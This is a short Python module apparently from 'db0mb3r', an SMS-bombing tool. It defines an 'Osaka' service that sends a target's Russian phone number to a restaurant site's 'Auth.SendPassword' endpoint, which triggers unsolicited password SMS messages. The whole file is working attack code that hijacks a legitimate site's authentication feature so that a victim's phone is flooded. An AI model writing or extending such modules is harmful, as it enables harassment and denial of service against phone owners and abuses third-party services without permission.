from db0mb3r.services.service import Service


class Osaka(Service):
    phone_codes = [7]

    async def run(self):
        await self.post(
            "https://www.osaka161.ru/local/tools/webstroy.webservice.php",
            data={
                "name": "Auth.SendPassword",
                "params[0]": self.format(self.formatted_phone, "+* (***) ***-**-**"),
            },
        )
